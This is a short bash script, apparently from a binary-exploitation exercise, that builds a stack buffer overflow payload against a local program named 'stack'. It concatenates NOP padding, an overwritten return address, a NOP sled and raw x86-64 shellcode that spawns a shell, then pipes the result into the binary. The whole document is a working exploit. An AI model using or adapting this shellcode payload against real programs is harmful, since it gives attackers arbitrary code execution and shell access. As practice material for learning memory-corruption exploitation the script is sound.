#!/bin/bash

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
padding=$(printf '\x90%.0s' {1..72})

# buffer at 0x7fffffffdee0 - so ended at 0x7fffffffdf20 - lets add 48 bytes to be sure:
# so 0x7fffffffdf38:
eip="\x50\xdf\xff\xff\xff\x7f\x00\x00"

# buffer starts at 0x7fffffffdee0:
sled=$(printf '\x90%.0s' {1..64})
payload="${padding}${eip}${sled}${shellcode}"
echo -e "${payload}" | ./stack


